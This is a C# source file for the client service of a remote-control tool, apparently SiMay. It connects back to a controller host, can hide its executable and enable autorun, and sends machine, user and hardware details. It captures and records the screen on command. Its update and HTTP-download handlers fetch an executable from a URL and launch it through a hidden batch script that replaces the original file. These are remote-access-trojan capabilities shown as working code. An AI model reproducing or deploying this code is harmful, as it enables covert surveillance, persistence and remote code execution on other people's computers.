using SiMay.Core;
using System;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using SiMay.Sockets.Tcp;
using SiMay.Sockets.Tcp.Client;
using SiMay.Sockets.Tcp.Session;
using SiMay.Sockets.Tcp.TcpConfiguration;
using SiMay.Basic;
using System.Net;
using System.IO;
using SiMay.ServiceCore.Helper;
using SiMay.ServiceCore.Attributes;
using System.Drawing;
using SiMay.RemoteService.Loader.Interface;
using SiMay.RemoteService.Loader.Entitys;
using System.Collections.Generic;

namespace SiMay.ServiceCore.MainService
{
    public class MainService : MainApplicationService, IAppMainService
    {
        /// <summary>
        /// 正常
        /// </summary>
        private const int STATE_NORMAL = 1;

        /// <summary>
        /// 断开
        /// </summary>
        private const int STATE_DISCONNECT = 0;

        private int _sessionKeepSign = STATE_DISCONNECT;//主连接状态

        private bool _screenViewIsAction = false;
        private int _screen_record_height;
        private int _screen_record_width;
        private int _screen_record_spantime;

        private TcpSocketSaeaClientAgent _clientAgent;
        private ServiceTaskQueue _taskQueue = new ServiceTaskQueue();
        public MainService(StartParameterEx startParameter)
        {
            while (true) //第一次解析域名,直至解析成功
            {
                var ip = HostHelper.GetHostByName(startParameter.Host);
                if (ip != null)
                {
                    AppConfiguartion.ServerIPEndPoint = new IPEndPoint(IPAddress.Parse(ip), startParameter.Port);
                    break;
                }

                Console.WriteLine(startParameter.Host ?? "address analysis is null");

                Thread.Sleep(5000);
            }
            AppConfiguartion.HostAddress = startParameter.Host;
            AppConfiguartion.HostPort = startParameter.Port;
            AppConfiguartion.AccessKey = startParameter.AccessKey;
            AppConfiguartion.DefaultRemarkInfo = startParameter.RemarkInformation;
            AppConfiguartion.DefaultGroupName = startParameter.GroupName;
            AppConfiguartion.IsAutoRun = startParameter.IsAutoStart;
            AppConfiguartion.IsHideExcutingFile = startParameter.IsHide;
            AppConfiguartion.RunTime = startParameter.RunTimeText;
            AppConfiguartion.Version = startParameter.ServiceVersion;
            AppConfiguartion.CenterServiceMode = startParameter.SessionMode == 1 ? true : false;
            AppConfiguartion.IdentifyId = startParameter.UniqueId;

            if (AppConfiguartion.IsHideExcutingFile)
                SystemHelper.SetExecutingFileHide(true);

            if (AppConfiguartion.IsAutoRun)
                SystemHelper.SetAutoRun(true);

            _screen_record_height = AppConfiguartion.ScreenRecordHeight;
            _screen_record_width = AppConfiguartion.ScreenRecordWidth;
            _screen_record_spantime = AppConfiguartion.ScreenRecordSpanTime;

            //创建通讯接口实例
            var clientConfig = new TcpSocketSaeaClientConfiguration();
            if (!AppConfiguartion.CenterServiceMode)
            {
                //服务版配置
                clientConfig.AppKeepAlive = true;
                clientConfig.KeepAlive = false;
            }
            else
            {
                //中间服务器版服务端配置
                clientConfig.AppKeepAlive = false;
                clientConfig.KeepAlive = true;
            }
            clientConfig.KeepAliveInterval = 5000;
            clientConfig.KeepAliveSpanTime = 1000;
            clientConfig.CompressTransferFromPacket = false;

            _clientAgent = TcpSocketsFactory.CreateClientAgent(TcpSocketSaeaSessionType.Packet, clientConfig, Notify);
            ConnectToServer();
        }


        /// <summary>
        /// Loader专用构造函数
        /// </summary>
        /// <param name="startParameter"></param>
        /// <param name="clientAgent"></param>
        /// <param name="session"></param>
        /// <param name="serviceIPEndPoint"></param>
        public MainService(
            StartParameter startParameter,
            TcpSocketSaeaClientAgent clientAgent,
            TcpSocketSaeaSession session,
            IPEndPoint serviceIPEndPoint
            )
        {
            _clientAgent = clientAgent;
            _sessionKeepSign = 1;//主连接状态
            this.SetSession(session);

            session.AppTokens = new object[2]
            {
                ConnectionWorkType.MAINCON,
                null
            };

            AppConfiguartion.HostAddress = startParameter.Host;
            AppConfiguartion.HostPort = startParameter.Port;
            AppConfiguartion.AccessKey = startParameter.AccessKey;
            AppConfiguartion.DefaultRemarkInfo = startParameter.RemarkInformation;
            AppConfiguartion.DefaultGroupName = startParameter.GroupName;
            AppConfiguartion.IsAutoRun = startParameter.IsAutoStart;
            AppConfiguartion.IsHideExcutingFile = startParameter.IsHide;
            AppConfiguartion.RunTime = startParameter.RunTimeText;
            AppConfiguartion.Version = startParameter.ServiceVersion;
            AppConfiguartion.CenterServiceMode = startParameter.SessionMode == 1 ? true : false;
            AppConfiguartion.IdentifyId = startParameter.UniqueId;
            AppConfiguartion.ServerIPEndPoint = serviceIPEndPoint;

            this.SendLoginPack(session);
        }

        private void ConnectToServer()
        {
            //尝试解析出最新的域名地址
            ThreadHelper.ThreadPoolStart(c =>
            {
                var ip = HostHelper.GetHostByName(AppConfiguartion.HostAddress);
                if (ip.IsNullOrEmpty())
                    return;
                AppConfiguartion.ServerIPEndPoint = new IPEndPoint(IPAddress.Parse(ip), AppConfiguartion.HostPort);
            });
            _clientAgent.ConnectToServer(AppConfiguartion.ServerIPEndPoint);
        }

        /// <summary>
        /// 发送确认包
        /// 作用：连接确认，以便服务端识别这是一个有效的工作连接，type = 中间服务器识别 ， accessId = 发起创建应用服务请求的主控端标识
        /// </summary>
        /// <param name="session"></param>
        private void SendACK(TcpSocketSaeaSession session, ConnectionWorkType type, long accessId)
        {
            SendTo(session, MessageHead.C_GLOBAL_CONNECT,
                new AckPack()
                {
                    AccessId = accessId,//当前主控端标识
                    AccessKey = AppConfiguartion.AccessKey,
                    Type = (byte)type
                });
        }

        /// <summary>
        /// 通信库主消息处理函数
        /// </summary>
        /// <param name="notify"></param>
        /// <param name="session"></param>
        public void Notify(TcpSessionNotify notify, TcpSocketSaeaSession session)
        {
            try
            {
                switch (notify)
                {
                    case TcpSessionNotify.OnConnected:
                        this.ConnectedHandler(session, notify);
                        break;
                    case TcpSessionNotify.OnDataReceiveing:
                        break;
                    case TcpSessionNotify.OnDataReceived:
                        var workType = (ConnectionWorkType)session.AppTokens[0];
                        if (workType == ConnectionWorkType.MAINCON)
                            this.HandlerBinder.InvokePacketHandler(session, GetMessageHead(session), this);
                        else if (workType == ConnectionWorkType.WORKCON)
                        {
                            var appService = ((ApplicationRemoteService)session.AppTokens[1]);
                            appService.HandlerBinder.InvokePacketHandler(session, GetMessageHead(session), appService);
                        }
                        break;
                    case TcpSessionNotify.OnClosed:
                        this.CloseHandler(session, notify);
                        break;
                }
            }
            catch (Exception ex)
            {
                StringBuilder sb = new StringBuilder();
                sb.Append(ex.Message);
                sb.Append(ex.StackTrace);
                LogHelper.WriteErrorByCurrentMethod(sb.ToString());

                Console.WriteLine(ex.Message);
            }

        }

        /// <summary>
        /// 连接初始化
        /// 
        /// 作用：分配工作类型
        /// </summary>
        /// <param name="session"></param>
        /// <param name="notify"></param>
        private void ConnectedHandler(TcpSocketSaeaSession session, TcpSessionNotify notify)
        {
            //当服务主连接离线或未连接，优先与session关联
            if (Interlocked.Exchange(ref _sessionKeepSign, STATE_NORMAL) == STATE_DISCONNECT)
            {
                session.AppTokens = new object[2]
                {
                    ConnectionWorkType.MAINCON,
                    null
                };
                this.SetSession(session);
                //服务主连接accessId保留
                this.SendACK(session, ConnectionWorkType.MAINCON, 0);
            }
            else
            {
                ApplicationRemoteService service = _taskQueue.Dequeue();
                if (service.IsNull())
                {
                    //找不到服务。。
                    session.Close(false);
                    return;
                }
                session.AppTokens = new object[2]
                {
                    ConnectionWorkType.WORKCON,
                    service
                };
                service.SetSession(session);
                this.SendACK(session, ConnectionWorkType.WORKCON, service.AccessId);
            }

        }
        private void CloseHandler(TcpSocketSaeaSession session, TcpSessionNotify notify)
        {
            if (_sessionKeepSign == STATE_DISCONNECT && session.AppTokens.IsNull())
            {
                //服务主连接断开或未连接
                session.AppTokens = new object[2]
                {
                    ConnectionWorkType.MAINCON,
                    null
                };
            }
            else if (_sessionKeepSign == STATE_NORMAL && session.AppTokens.IsNull())//task连接，连接服务器失败
            {
                _taskQueue.Dequeue();
                return;//不重试连接，因为可能会连接不上，导致频繁重试连接
            }

            var workType = (ConnectionWorkType)session.AppTokens[0];
            if (workType == ConnectionWorkType.MAINCON)
            {
                _screenViewIsAction = false;
                //清除主连接会话信息
                this.SetSession(null);
                Interlocked.Exchange(ref _sessionKeepSign, STATE_DISCONNECT);

                var timer = new System.Timers.Timer();
                timer.Interval = 5000;
                timer.Elapsed += (s, e) =>
                {
                    //主连接重连
                    ConnectToServer();

                    timer.Stop();
                    timer.Dispose();
                };
                timer.Start();
            }
            else if (workType == ConnectionWorkType.WORKCON)
            {
                var appService = ((ApplicationRemoteService)session.AppTokens[1]);
                if (appService.WhetherClosed)
                    return;
                appService.WhetherClosed = true;
                appService.SessionClosed();
            }
        }
        private void PostTaskToQueue(ApplicationRemoteService service)
        {
            this._taskQueue.Enqueue(service);
            this.ConnectToServer();
        }

        [PacketHandler(MessageHead.S_MAIN_ACTIVATE_APPLICATIONSERVICE)]
        private void ActivateApplicationService(TcpSocketSaeaSession session)
        {
            var activateServicePack = GetMessageEntity<ActivateServicePack>(session);
            string key = activateServicePack.ApplicationKey;

            //获取当前消息发送源主控端标识
            long accessId = this.GetAccessId(session);
            var context = SysUtil.ControlTypes.FirstOrDefault(x => x.ServiceKey.Equals(key));
            if (context != null)
            {
                var serviceName = context.AppServiceType.GetCustomAttribute<ServiceNameAttribute>(true);
                SystemMessageNotify.ShowTip($"正在进行远程操作:{(serviceName.IsNull() ? context.ServiceKey : serviceName.Name) }");
                var appService = Activator.CreateInstance(context.AppServiceType, null) as ApplicationRemoteService;
                appService.AppServiceKey = context.ServiceKey;
                appService.AccessId = accessId;
                this.PostTaskToQueue(appService);
            }
        }

        [PacketHandler(MessageHead.S_MAIN_REMARK)]
        private void SetRemarkInfo(TcpSocketSaeaSession session)
        {
            var des = GetMessage(session).ToUnicodeString();
            AppConfiguartion.RemarkInfomation = des;
        }

        [PacketHandler(MessageHead.S_MAIN_GROUP)]
        private void SetGroupName(TcpSocketSaeaSession session)
        {
            var groupName = GetMessage(session).ToUnicodeString();
            AppConfiguartion.GroupName = groupName;
        }

        [PacketHandler(MessageHead.S_MAIN_SESSION)]
        private void SetSystemSession(TcpSocketSaeaSession session)
        {
            SystemHelper.SetSessionStatus(GetMessage(session)[0]);
        }

        [PacketHandler(MessageHead.S_MAIN_RELOADER)]
        private void ReLoader(TcpSocketSaeaSession session)
        {
            Application.Restart();
        }

        [PacketHandler(MessageHead.S_MAIN_UPDATE)]
        private void UpdateService(TcpSocketSaeaSession session)
        {
            try
            {
                var pack = GetMessageEntity<RemoteUpdatePack>(session);

                string tempFile = this.GetTempFilePath(".exe");
                if (pack.UrlOrFileUpdate == RemoteUpdateType.File)
                {
                    using (var stream = File.Open(tempFile, FileMode.Create, FileAccess.Write))
                    {
                        stream.Seek(0, SeekOrigin.Begin);
                        stream.Write(pack.FileDate, 0, pack.FileDate.Length);
                    }
                }
                else if (pack.UrlOrFileUpdate == RemoteUpdateType.Url)
                {
                    using (WebClient c = new WebClient())
                    {
                        c.Proxy = null;
                        c.DownloadFile(pack.DownloadUrl, tempFile);
                    }
                }

                if (File.Exists(tempFile) && new FileInfo(tempFile).Length > 0)
                {
                    var batchFile = CreateBatch(Application.ExecutablePath, tempFile);
                    if (!batchFile.IsNullOrEmpty())
                    {
                        ProcessStartInfo startInfo = new ProcessStartInfo
                        {
                            WindowStyle = ProcessWindowStyle.Hidden,
                            UseShellExecute = true,
                            FileName = batchFile
                        };
                        Process.Start(startInfo);

                        Environment.Exit(0);//退出程序
                    }
                    else
                    {
                        LogHelper.WriteErrorByCurrentMethod("远程更新失败，更新脚本创建失败!");
                    }
                }
                else
                {
                    LogHelper.WriteErrorByCurrentMethod("远程更新失败，服务端文件不存在!");
                }
            }
            catch (Exception ex)
            {
                LogHelper.WriteErrorByCurrentMethod(ex);
            }

            string CreateBatch(string currentFilePath, string newFilePath)
            {
                try
                {
                    string tempFilePath = this.GetTempFilePath(".bat");

                    string updateBatch =
                        "@echo off" + "\r\n" +
                        "chcp 65001" + "\r\n" +
                        "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
                        "ping -n 10 localhost > nul" + "\r\n" +
                        "del /a /q /f " + "\"" + currentFilePath + "\"" + "\r\n" +
                        "move /y " + "\"" + newFilePath + "\"" + " " + "\"" + currentFilePath + "\"" + "\r\n" +
                        "start \"\" " + "\"" + currentFilePath + "\"" + "\r\n" +
                        "del /a /q /f " + "\"" + tempFilePath + "\"";

                    File.WriteAllText(tempFilePath, updateBatch, new UTF8Encoding(false));
                    return tempFilePath;
                }
                catch (Exception)
                {
                    return string.Empty;
                }
            }
        }

        private string GetTempFilePath(string extension)
        {
            string tempFilePath;
            do
            {
                tempFilePath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + extension);
            } while (File.Exists(tempFilePath));

            return tempFilePath;
        }

        [PacketHandler(MessageHead.S_MAIN_HTTPDOWNLOAD)]
        private void HttpDownloadExecute(TcpSocketSaeaSession session)
        {
            DownloadHelper.DownloadFile(GetMessage(session));
        }

        [PacketHandler(MessageHead.S_MAIN_OPEN_WEBURL)]
        private void OpenUrl(TcpSocketSaeaSession session)
        {
            try
            {
                Process.Start(GetMessage(session).ToUnicodeString());
            }
            catch { }
        }

        [PacketHandler(MessageHead.S_MAIN_CREATE_DESKTOPVIEW)]
        private void CreateDesktopView(TcpSocketSaeaSession session)
        {
            var isConstraint = GetMessage(session)[0];
            AppConfiguartion.IsOpenScreenView = true;
            if (!_screenViewIsAction || isConstraint == 0)
                this.OnRemoteCreateDesktopView();
        }

        /// <summary>
        /// 发送桌面下一帧
        /// </summary>
        /// <param name="session"></param>
        [PacketHandler(MessageHead.S_MAIN_DESKTOPVIEW_GETFRAME)]
        private void SendNextFrameDesktopView(TcpSocketSaeaSession session)
        {
            ThreadHelper.ThreadPoolStart(c =>
            {
                var args = c.ConvertTo<object[]>();
                var accessId = args[0].ConvertTo<long>();
                var getframe = args[1].ConvertTo<DesktopViewGetFramePack>();
                if (getframe.Width == 0 || getframe.Height == 0 || getframe.TimeSpan == 0 || getframe.TimeSpan < 50)
                    return;

                Thread.SetData(Thread.GetNamedDataSlot("AccessId"), accessId);

                Thread.Sleep(getframe.TimeSpan);

                SendTo(session, MessageHead.C_MAIN_DESKTOPVIEW_FRAME,
                    new DesktopViewFramePack()
                    {
                        InVisbleArea = getframe.InVisbleArea,
                        ViewData = ImageExtensionHelper.CaptureNoCursorToBytes(new Size(getframe.Width, getframe.Height))
                    });
            }, new object[] { GetAccessId(session), GetMessageEntity<DesktopViewGetFramePack>(session) });
        }
        [PacketHandler(MessageHead.S_MAIN_DESKTOPVIEW_CLOSE)]
        private void CloseDesktopView(TcpSocketSaeaSession session)
        {
            _screenViewIsAction = false;
            AppConfiguartion.IsOpenScreenView = false;
        }
        [PacketHandler(MessageHead.S_MAIN_DESKTOPRECORD_OPEN)]
        private void StartDesktopRecord(TcpSocketSaeaSession session)
        {
            var getframe = GetMessageEntity<DesktopRecordGetFramePack>(session);
            _screen_record_height = getframe.Height;
            _screen_record_width = getframe.Width;
            _screen_record_spantime = getframe.TimeSpan;

            if (_screen_record_height <= 0 || _screen_record_width <= 0 || _screen_record_spantime < 500)
                return;

            AppConfiguartion.ScreenRecordHeight = _screen_record_height;
            AppConfiguartion.ScreenRecordWidth = _screen_record_width;
            AppConfiguartion.ScreenRecordSpanTime = _screen_record_spantime;
            AppConfiguartion.IsScreenRecord = true;

            //主机名称作为目录名
            SendTo(session, MessageHead.C_MAIN_DESKTOPRECORD_OPEN, Environment.MachineName);
        }
        [PacketHandler(MessageHead.S_MAIN_DESKTOPRECORD_CLOSE)]
        private void DesktopRecordClose(TcpSocketSaeaSession session)
            => AppConfiguartion.IsScreenRecord = false;

        /// <summary>
        /// 远程创建屏幕墙屏幕视图
        /// </summary>
        private void OnRemoteCreateDesktopView()
        {
            _screenViewIsAction = true;
            //创建屏幕
            string RemarkName = AppConfiguartion.RemarkInfomation ?? AppConfiguartion.DefaultRemarkInfo;

            SendTo(CurrentSession, MessageHead.C_MAIN_DESKTOPVIEW_CREATE,
                new DesktopViewDescribePack()
                {
                    MachineName = Environment.MachineName,
                    RemarkInformation = RemarkName
                });
        }



        /// <summary>
        /// 发送下一帧屏幕记录
        /// </summary>
        /// <param name="width"></param>
        /// <param name="height"></param>
        [PacketHandler(MessageHead.S_MAIN_DESKTOPRECORD_GETFRAME)]
        private void SendNextDesktopRecordFrame(TcpSocketSaeaSession session)
        {

            ThreadPool.QueueUserWorkItem((o) =>
            {
                if (_screen_record_width == 0 || _screen_record_height == 0)
                    return;

                Thread.Sleep(_screen_record_spantime);

                SendTo(session, MessageHead.C_MAIN_DESKTOPRECORD_FRAME, ImageExtensionHelper.CaptureNoCursorToBytes(new Size(_screen_record_width, _screen_record_height)));
            });
        }

        [PacketHandler(MessageHead.S_MAIN_MESSAGEBOX)]
        private void ShowMessageBox(TcpSocketSaeaSession session)
        {
            var msg = GetMessageEntity<MessagePack>(session);
            ThreadHelper.CreateThread(() =>
            {
                string title = msg.MessageTitle;
                string cont = msg.MessageBody;

                switch ((MessageIcon)msg.MessageIcon)
                {
                    case MessageIcon.Error:
                        MessageBox.Show(cont, title, 0, MessageBoxIcon.Error, MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
                        break;

                    case MessageIcon.Question:
                        MessageBox.Show(cont, title, 0, MessageBoxIcon.Question, MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
                        break;

                    case MessageIcon.InforMation:
                        MessageBox.Show(cont, title, 0, MessageBoxIcon.Information, MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
                        break;

                    case MessageIcon.Exclaim:
                        MessageBox.Show(cont, title, 0, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
                        break;
                }
            }, true);
        }
        /// <summary>
        /// 发送上线包
        /// </summary>
        [PacketHandler(MessageHead.S_GLOBAL_OK)]
        private void SendLoginPack(TcpSocketSaeaSession session)
        {
            string remarkInfomation = AppConfiguartion.RemarkInfomation ?? AppConfiguartion.DefaultRemarkInfo;
            string groupName = AppConfiguartion.GroupName ?? AppConfiguartion.DefaultGroupName;
            bool openScreenWall = AppConfiguartion.IsOpenScreenView;//默认为打开屏幕墙
            bool openScreenRecord = AppConfiguartion.IsScreenRecord; //默认屏幕记录

            var loginPack = new LoginPack();
            loginPack.IPV4 = SystemInfoHelper.GetLocalIPV4();
            loginPack.MachineName = Environment.MachineName ?? string.Empty;
            loginPack.Remark = remarkInfomation;
            loginPack.ProcessorCount = Environment.ProcessorCount;
            loginPack.ProcessorInfo = SystemInfoHelper.GetMyCpuInfo;
            loginPack.MemorySize = SystemInfoHelper.GetMyMemorySize;
            loginPack.StartRunTime = AppConfiguartion.RunTime;
            loginPack.ServiceVison = AppConfiguartion.Version;
            loginPack.UserName = Environment.UserName.ToString();
            loginPack.OSVersion = SystemInfoHelper.GetOSFullName;
            loginPack.GroupName = groupName;
            loginPack.OpenScreenWall = openScreenWall;
            loginPack.ExistCameraDevice = SystemInfoHelper.ExistCameraDevice();
            loginPack.ExitsRecordDevice = SystemInfoHelper.ExistRecordDevice();
            loginPack.ExitsPlayerDevice = SystemInfoHelper.ExistPlayDevice();
            loginPack.IdentifyId = AppConfiguartion.IdentifyId;
            loginPack.OpenScreenRecord = openScreenRecord;
            loginPack.RecordHeight = _screen_record_height;
            loginPack.RecordWidth = _screen_record_width;
            loginPack.RecordSpanTime = _screen_record_spantime;
            loginPack.HasLoadServiceCOM = true;//已加载

            SendTo(session, MessageHead.C_MAIN_LOGIN, loginPack);
        }
    }
}